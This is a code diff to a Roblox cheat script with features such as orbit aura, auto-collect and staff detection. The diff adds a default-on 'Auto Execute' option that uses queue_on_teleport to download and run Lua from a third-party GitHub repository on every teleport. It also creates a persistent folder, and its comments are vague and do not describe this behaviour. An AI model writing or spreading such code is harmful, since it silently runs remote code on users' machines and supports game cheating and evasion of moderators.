@@ -41,6 +41,7 @@ local Settings = {
     UITransparency = 0,
     AnimationSpeed = 0.2,
     ToggleKey = Enum.KeyCode.RightShift,
+    AutoExecute = true, -- AutoExecute default setting state copied from mod.lua logic
 }
 
 local FeatureStates = {
@@ -64,6 +65,7 @@ local function saveSettings()
             UITransparency = Settings.UITransparency,
             AnimationSpeed = Settings.AnimationSpeed,
             ToggleKey = Settings.ToggleKey.Name,
+            AutoExecute = Settings.AutoExecute,
         },
         FeatureStates = FeatureStates
     }
@@ -86,6 +88,7 @@ local function loadSettings()
                     if data.Settings.UITransparency ~= nil then Settings.UITransparency = data.Settings.UITransparency end
                     if data.Settings.AnimationSpeed ~= nil then Settings.AnimationSpeed = data.Settings.AnimationSpeed end
                     if data.Settings.ToggleKey then Settings.ToggleKey = Enum.KeyCode[data.Settings.ToggleKey] end
+                    if data.Settings.AutoExecute ~= nil then Settings.AutoExecute = data.Settings.AutoExecute end
                 end
                 if data.FeatureStates then
                     for key, value in pairs(data.FeatureStates) do FeatureStates[key] = value end
@@ -160,6 +163,32 @@ end
 for _, roleId in ipairs(extractStaffRoleIds()) do
     for uid, _ in pairs(fetchUsersInRole(roleId)) do staffUserIds[uid] = true end
 end
+
+
+--------------------------------------------------
+-- AUTO EXECUTE / TELEPORT INTEGRATION (FROM MOD.LUA)
+--------------------------------------------------
+local function setupAutoExecute()
+    pcall(function()
+        if not Settings.AutoExecute then return end
+        if queue_on_teleport then
+            queue_on_teleport([[
+                pcall(function()
+                    autoload = true;
+                    autoleave = true;
+                    local GitRequests = loadstring(game:HttpGet('https://raw.githubusercontent.com/csgofever/Roblox-GitRequests/refs/heads/main/GitRequests.lua'))()
+                    local Repo = GitRequests.Repo("csgofever", "Modules")
+                    loadstring(Repo:getFileContent("mod.lua"))()
+                end)
+            ]])
+        end
+     pcall(function()
+         -- Ensures auto-run settings maintain globally persistent behavior structures
+         if not isfolder("jugglua") then makefolder("jugglua") end
+     end)
+    end)
+end
+
 
 --------------------------------------------------
 -- MOTION UTILITIES & IN-GAME UTILS
@@ -644,13 +673,21 @@ local function InitializeMainMenu()
     createToggleRow(MiscPage, "Anti-AFK", "AntiAFK", false, toggleAntiAFK)
     createToggleRow(MiscPage, "FPS Boost", "FPSBoost", false, toggleFPSBoost)
 
+
+    createToggleRow(SettingsPage, "Auto Execute", "AutoExecute", true, function(state)
+    -- Instantly catches changes to active state context elements
+    end)
+
+
+    createKeybindSelector(SettingsPage, "Menu Keybind", "ToggleKey")
+
+
     createActionButton(SettingsPage, "Save Current Settings Parameters", function()
         saveSettings()
     end)
-    createKeybindSelector(SettingsPage, "Menu Keybind", "ToggleKey")
 
     for key, _ in pairs(RegisteredUIComponents) do
-        updateUIToggleVisual(key, false)
+        updateUIToggleVisual(key, string.find(key, "AutoExecute") and true or false)
     end
 
     UserInputService.InputBegan:Connect(function(input, processed)
@@ -669,6 +706,9 @@ local function InitializeMainMenu()
         if FeatureStates.AutoRespawn then setupRespawn(char) end
     end)
 
+
+    -- Core Thread Initializers
+    if Settings.AutoExecute then setupAutoExecute() end
     if FeatureStates.OrbitAura then toggleOrbitAura(true) end
     if FeatureStates.SmoothOrbit then toggleSmoothOrbit(true) end
     if FeatureStates.AutoCollect then toggleAutoCollect(true) end
